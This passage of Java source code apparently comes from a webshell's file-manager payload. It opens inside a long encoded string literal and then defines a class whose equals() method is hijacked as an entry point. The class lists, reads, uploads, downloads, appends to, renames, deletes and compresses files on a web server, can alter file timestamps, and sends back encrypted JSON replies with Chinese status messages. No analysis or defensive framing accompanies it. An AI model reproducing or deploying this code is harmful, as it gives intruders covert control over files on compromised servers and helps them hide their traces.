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fw6u+lF+mmN/Tq76VHdNM9Xv299Jzd9EZe/b30rOf/SG/s1d9Lf9tNb+LV30t/1k1v6tXfS3/QTW/m1d9Lz+imN/fq76Vf7qa38Or/i3f8u+mkV38v/Xg3vaVXfy/9QDc9zqu/l76nm97Kq7+Xvq2b3tqrv5e+vpvexqu/l76ym97Wq7+XvrSb3s6rv5c+r5tOefX30lO76e29+nvpKd30Dl79vfRx3fSOXv299OHd9E5e/b30Qd30zl79vfQ+3fQuXv299Phuelev/rO8499Np736e+lx3fRuXv299Mbd9Hiv/l56nW56d6/+XnpsN72HV38vPaab3tOrv5ce3U3v5dXfSy/STU/w6u+lR3TTGa/+XnrObnpvr/5eetZzf6T38ervpb/tpvf16u+lP+um9/Pq76U/6KYnevX30jO66f29+nvpl7vpA7z6/+wd/24669XfSz/eTR/o1d9LP9BNH+TV30vf001P8urvpW/rpg/26u+lr++mD/Hq76Wv7KYP9ervpS/tpg/z6u+lz+umc179vfTUbnqyV38vPaWbPtyrv5c+rps+wqu/lz68mz7Sq7+XPqibPsqrv5fep5s+2qu/lx7fTR/j1b/jHf9uOu/V30uP66aP9ervpTfupo/z6u+l1+mmj/fq76XHdtMnePX30mO66RO9+nvp0d30SV79vfQi3fTJXv299Ihuuterv5ees5v+s1d/Lz3r2T/SU7z6e+lvu+lTvPp76c+66VO9+nvpD7rpv3j199Izuun/8+rvpV/upk/z6v+Td/y76YJXfy/9eDd9uld/L/1ANz3Vq7+XvqebPsOrv5e+rZs+06u/l76+mz7Lq7+XvrKbPturv5e+tJs+x6u/lz6vm+7z6u+lp3bT53r199JTuunzvPp76eO66fO9+nvpw7vpC7z6e+mDuukLvfp76X266Yu8+nvp8d30xV79f/SOfzdd9Orvpcd105d49ffSG3fTl3r199LrdNOXefX30mO76b969ffSY7rpv3n199Kju+m/e/X30ot005d79ffSI7rpkld/Lz1nN32FV38vPeuZP9JXevX30t920//w6u+lP+umr/Lq76U/6Kav9urvpWd009d49ffSL3fT13r1/8E7/t102au/l368m77Oq7+XfqCbvt6rv5e+p5u+wau/l76tm77Rq7+Xvr6bvsmrv5e+spu+2a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";
        this.osCharset = Charset.forName(System.getProperty("sun.jnu.encoding"));
    }

    public boolean equals(Object obj) {
        Map<String, String> result = new HashMap();
        try {
            try {
                fillContext(obj);
                if (mode.equalsIgnoreCase("list")) {
                    result.put("msg", list());
                    result.put("status", "success");
                } else if (mode.equalsIgnoreCase("show")) {
                    result.put("msg", show());
                    result.put("status", "success");
                } else if (mode.equalsIgnoreCase("checkExist")) {
                    result.put("msg", checkExist(path));
                    result.put("status", "success");
                } else if (mode.equalsIgnoreCase("delete")) {
                    result = delete();
                } else if (mode.equalsIgnoreCase("create")) {
                    result.put("msg", create());
                    result.put("status", "success");
                } else if (mode.equalsIgnoreCase("append")) {
                    result.put("msg", append());
                    result.put("status", "success");
                } else if (mode.equalsIgnoreCase("update")) {
                    updateFile();
                    result.put("msg", "ok");
                    result.put("status", "success");
                } else if (mode.equalsIgnoreCase("downloadPart")) {
                    result.put("msg", downloadPart(path, Long.parseLong(blockIndex), Long.parseLong(blockSize)));
                    result.put("status", "success");
                } else {
                    if (mode.equalsIgnoreCase("download")) {
                        download();
                        try {
                            Object so = this.Response.getClass().getMethod("getOutputStream", new Class[0]).invoke(this.Response, new Object[0]);
                            Method write = so.getClass().getMethod("write", byte[].class);
                            write.invoke(so, Encrypt(buildJson(result, true).getBytes("UTF-8")));
                            so.getClass().getMethod("flush", new Class[0]).invoke(so, new Object[0]);
                            so.getClass().getMethod("close", new Class[0]).invoke(so, new Object[0]);
                        } catch (Exception e) {
                            e.printStackTrace();
                        }
                        return true;
                    }
                    if (mode.equalsIgnoreCase("rename")) {
                        result = renameFile();
                    } else if (mode.equalsIgnoreCase("createFile")) {
                        result.put("msg", createFile());
                        result.put("status", "success");
                    } else if (mode.equalsIgnoreCase("compress")) {
                        zipFile(path, true);
                        result.put("msg", "ok");
                        result.put("status", "success");
                    } else if (mode.equalsIgnoreCase("createDirectory")) {
                        result.put("msg", createDirectory());
                        result.put("status", "success");
                    } else if (mode.equalsIgnoreCase("getTimeStamp")) {
                        result.put("msg", getTimeStamp());
                        result.put("status", "success");
                    } else if (mode.equalsIgnoreCase("updateTimeStamp")) {
                        result.put("msg", updateTimeStamp());
                        result.put("status", "success");
                    } else if (mode.equalsIgnoreCase("check")) {
                        result.put("msg", checkFileHash(path));
                        result.put("status", "success");
                    }
                }
                try {
                    Object so2 = this.Response.getClass().getMethod("getOutputStream", new Class[0]).invoke(this.Response, new Object[0]);
                    Method write2 = so2.getClass().getMethod("write", byte[].class);
                    write2.invoke(so2, Encrypt(buildJson(result, true).getBytes("UTF-8")));
                    so2.getClass().getMethod("flush", new Class[0]).invoke(so2, new Object[0]);
                    so2.getClass().getMethod("close", new Class[0]).invoke(so2, new Object[0]);
                    return true;
                } catch (Exception e2) {
                    e2.printStackTrace();
                    return true;
                }
            } catch (Throwable e3) {
                e3.printStackTrace();
                result.put("msg", e3.getMessage());
                result.put("status", "fail");
                try {
                    Object so3 = this.Response.getClass().getMethod("getOutputStream", new Class[0]).invoke(this.Response, new Object[0]);
                    Method write3 = so3.getClass().getMethod("write", byte[].class);
                    write3.invoke(so3, Encrypt(buildJson(result, true).getBytes("UTF-8")));
                    so3.getClass().getMethod("flush", new Class[0]).invoke(so3, new Object[0]);
                    so3.getClass().getMethod("close", new Class[0]).invoke(so3, new Object[0]);
                    return true;
                } catch (Exception e4) {
                    e4.printStackTrace();
                    return true;
                }
            }
        } catch (Throwable th) {
            try {
                Object so4 = this.Response.getClass().getMethod("getOutputStream", new Class[0]).invoke(this.Response, new Object[0]);
                Method write4 = so4.getClass().getMethod("write", byte[].class);
                write4.invoke(so4, Encrypt(buildJson(result, true).getBytes("UTF-8")));
                so4.getClass().getMethod("flush", new Class[0]).invoke(so4, new Object[0]);
                so4.getClass().getMethod("close", new Class[0]).invoke(so4, new Object[0]);
            } catch (Exception e5) {
                e5.printStackTrace();
            }
            throw th;
        }
    }

    private String checkFileHash(String path2) throws Exception {
        FileChannel ch = (FileChannel) sessionGetAttribute(this.Session, path2);
        if (ch != null && ch.isOpen()) {
            ch.close();
        }
        byte[] input = getFileData(path2);
        if (input == null || input.length == 0) {
            return null;
        }
        MessageDigest md5 = MessageDigest.getInstance("MD5");
        md5.update(input);
        byte[] byteArray = md5.digest();
        StringBuilder sb = new StringBuilder();
        for (byte b : byteArray) {
            sb.append(String.format("%02x", Byte.valueOf(b)));
        }
        return sb.substring(0, 16);
    }

    private void updateFile() throws Exception {
        FileChannel ch = (FileChannel) sessionGetAttribute(this.Session, path);
        if (ch == null) {
            FileOutputStream fos = new FileOutputStream(path);
            ch = fos.getChannel();
            sessionSetAttribute(this.Session, "fos", fos);
            sessionSetAttribute(this.Session, path, ch);
        }
        synchronized (ch) {
            ch.position(Integer.parseInt(blockIndex) * Integer.parseInt(blockSize));
            ch.write(ByteBuffer.wrap(base64decode(content)));
        }
    }

    private Map<String, String> warpFileObj(File file) {
        Map<String, String> obj = new HashMap<>();
        obj.put("type", file.isDirectory() ? "directory" : "file");
        obj.put("name", file.getName());
        obj.put("size", file.length() + "");
        obj.put("perm", getFilePerm(file));
        obj.put("lastModified", new SimpleDateFormat("yyyy/MM/dd HH:mm:ss").format(new Date(file.lastModified())));
        return obj;
    }

    private boolean isOldJava() {
        String version = System.getProperty("java.version");
        if (version.compareTo("1.7") >= 0) {
            return false;
        }
        return true;
    }

    private String checkExist(String path2) throws Exception {
        File file = new File(path2);
        if (file.exists()) {
            return file.length() + "";
        }
        throw new Exception("");
    }

    private String getFilePerm(File file) {
        String permStr = "";
        if (isWindows()) {
            try {
                permStr = (file.canRead() ? "R" : "-") + "/" + (file.canWrite() ? "W" : "-") + "/" + (file.canExecute() ? "E" : "-");
            } catch (Error e) {
                permStr = (file.canRead() ? "R" : "-") + "/" + (file.canWrite() ? "W" : "-") + "/-";
            }
        } else {
            String version = System.getProperty("java.version");
            if (version.compareTo("1.7") >= 0) {
                try {
                    getClass();
                    Class<?> cls = Class.forName("java.nio.file.Files");
                    getClass();
                    Class<?> cls2 = Class.forName("java.nio.file.attribute.PosixFileAttributes");
                    getClass();
                    Class<?> cls3 = Class.forName("java.nio.file.Paths");
                    getClass();
                    Class<?> cls4 = Class.forName("java.nio.file.attribute.PosixFilePermissions");
                    Object f = cls3.getMethod("get", String.class, String[].class).invoke(cls3.getClass(), file.getAbsolutePath(), new String[0]);
                    Object attrs = cls.getMethod("readAttributes", Path.class, Class.class, LinkOption[].class).invoke(cls, f, cls2, new LinkOption[0]);
                    Object result = cls4.getMethod("toString", Set.class).invoke(cls4, cls2.getMethod("permissions", new Class[0]).invoke(attrs, new Object[0]));
                    permStr = result.toString();
                } catch (Exception e2) {
                }
            } else {
                permStr = (file.canRead() ? "R" : "-") + "/" + (file.canWrite() ? "W" : "-") + "/" + (file.canExecute() ? "E" : "-");
            }
        }
        return permStr;
    }

    private String list() throws Exception {
        File f = new File(path);
        List<Map<String, String>> objArr = new ArrayList<>();
        objArr.add(warpFileObj(new File(".")));
        objArr.add(warpFileObj(new File("..")));
        if (f.isDirectory() && f.listFiles() != null) {
            for (File temp : f.listFiles()) {
                objArr.add(warpFileObj(temp));
            }
        }
        String result = buildJsonArray(objArr, true);
        return result;
    }

    private String show() throws Exception {
        byte[] fileContent = getFileData(path);
        return base64encode(fileContent);
    }

    private byte[] getFileData(String path2) throws IOException {
        ByteArrayOutputStream output = new ByteArrayOutputStream();
        FileInputStream fis = new FileInputStream(new File(path2));
        while (true) {
            int data = fis.read();
            if (data != -1) {
                output.write(data);
            } else {
                fis.close();
                return output.toByteArray();
            }
        }
    }

    private String create() throws Exception {
        FileOutputStream fso = new FileOutputStream(path);
        fso.write(base64decode(content));
        fso.flush();
        fso.close();
        String result = path + "上传完成，远程文件大小:" + new File(path).length();
        return result;
    }

    private Map<String, String> renameFile() throws Exception {
        Map<String, String> result = new HashMap<>();
        File oldFile = new File(path);
        File newFile = new File(newPath);
        if (oldFile.exists() && (oldFile.isFile() & oldFile.renameTo(newFile))) {
            result.put("status", "success");
            result.put("msg", "重命名完成:" + newPath);
        } else {
            result.put("status", "fail");
            result.put("msg", "重命名失败:" + newPath);
        }
        return result;
    }

    private String createFile() throws Exception {
        FileOutputStream fso = new FileOutputStream(path);
        fso.close();
        String result = path + "创建完成";
        return result;
    }

    private String createDirectory() throws Exception {
        File dir = new File(path);
        dir.mkdirs();
        String result = path + "创建完成";
        return result;
    }

    private void download() throws Exception {
        FileInputStream fis = new FileInputStream(path);
        Object so = this.Response.getClass().getMethod("getOutputStream", new Class[0]).invoke(this.Response, new Object[0]);
        Method write = so.getClass().getMethod("write", byte[].class);
        while (true) {
            int data = fis.read();
            if (data != -1) {
                write.invoke(so, Integer.valueOf(data));
            } else {
                so.getClass().getMethod("flush", new Class[0]).invoke(so, new Object[0]);
                so.getClass().getMethod("close", new Class[0]).invoke(so, new Object[0]);
                fis.close();
                return;
            }
        }
    }

    private String append() throws Exception {
        FileOutputStream fso = new FileOutputStream(path, true);
        fso.write(base64decode(content));
        fso.flush();
        fso.close();
        String result = path + "追加完成，远程文件大小:" + new File(path).length();
        return result;
    }

    private Map<String, String> delete() throws Exception {
        Map<String, String> result = new HashMap<>();
        File f = new File(path);
        if (f.exists()) {
            if (f.delete()) {
                result.put("status", "success");
                result.put("msg", path + " 删除成功.");
            } else {
